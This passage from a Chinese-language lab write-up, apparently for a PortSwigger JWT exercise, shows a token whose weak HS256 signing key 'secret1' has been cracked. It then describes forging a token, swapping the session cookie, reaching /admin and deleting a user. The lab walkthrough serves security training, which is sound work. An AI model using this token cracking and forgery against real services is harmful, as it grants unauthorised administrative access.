eyJraWQiOiI1NjIwZDI1ZS1mMGI0LTQyODQtOTY3Ni1lZjljOGM2MGU4NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5MTQxNzAwNX0.vWII1zcKbAtyE49KY4IQ62YpIqzUbJzS-JSOLxJ0qdk:secret1
```

签名密钥为 `secret1`

#### 生成jwt

<img src=".\图片\Snipaste_2023-08-07_21-16-23.png" alt="Snipaste_2023-08-07_21-16-23" style="zoom:80%;" />

再就是替换 Cookie 访问 /admin，然后触发管理员操作，删除用户即可

<img src=".\图片\Snipaste_2023-08-07_21-18-39.png" alt="Snipaste_2023-08-07_21-18-39" style="zoom:80%;" />







